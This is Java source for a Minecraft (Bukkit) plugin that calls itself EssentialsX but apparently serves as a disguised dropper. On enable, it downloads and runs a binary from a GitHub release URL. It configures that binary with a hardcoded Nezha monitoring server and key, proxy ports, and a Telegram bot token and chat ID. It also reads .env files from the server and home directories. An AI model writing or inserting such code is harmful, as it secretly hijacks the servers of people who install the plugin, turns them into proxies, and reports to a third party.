package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean isProcessRunning = false;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "YT_WARPOUT"
    };

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        try {
            startSbxProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startSbxProcess() throws Exception {
        if (isProcessRunning) return;

        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://github.com/pingmike2/test/releases/download/amd64/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://github.com/pingmike2/test/releases/download/arm64/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://github.com/pingmike2/test/releases/download/s390x/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Files.createDirectories(tmpDir);
        Path sbxBinary = tmpDir.resolve("sbx");

        if (!Files.exists(sbxBinary)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }

        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        // ⚡ 全量环境变量
        Map<String, String> env = pb.environment();
        env.put("UUID", "b21795d8-0257-4cd1-a13f-aef25d120aa3");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        env.put("NEZHA_PORT", "443");
        env.put("NEZHA_KEY", "B8LPJsnO4AoAHdidrs");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "35486");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "7592034407");
        env.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "hoster");
        env.put("DISABLE_ARGO", "true");
        env.put("YT_WARPOUT", "true");

        // 系统环境覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isBlank()) env.put(var, value);
        }

        // Bukkit 配置覆盖
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.isBlank()) env.put(var, value);
        }

        // .env 文件覆盖
        loadEnvFileFromMultipleLocations(env);

        // 启动 sbsh
        sbxProcess = pb.start();
        isProcessRunning = true;

        // ⚡ 监控线程，只记录退出，不重启
        Thread monitor = new Thread(() -> {
            try {
                int exit = sbxProcess.waitFor();
                isProcessRunning = false;
                getLogger().warning("sbx process exited with code " + exit);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Monitor");
        monitor.setDaemon(true);
        monitor.start();
    }

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));

        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    for (String line : Files.readAllLines(envFile)) {
                        line = line.trim();
                        if (line.isEmpty() || line.startsWith("#")) continue;
                        line = line.split(" #")[0].split(" //")[0].trim();
                        if (line.startsWith("export ")) line = line.substring(7).trim();
                        String[] parts = line.split("=",2);
                        if (parts.length==2) {
                            String key = parts[0].trim();
                            String value = parts[1].trim().replaceAll("^['\"]|['\"]$","");
                            if (Arrays.asList(ALL_ENV_VARS).contains(key)) env.put(key,value);
                        }
                    }
                    break;
                } catch(IOException ignored){}
            }
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
        }
        isProcessRunning = false;
        getLogger().info("EssentialsX plugin disabled");
    }
}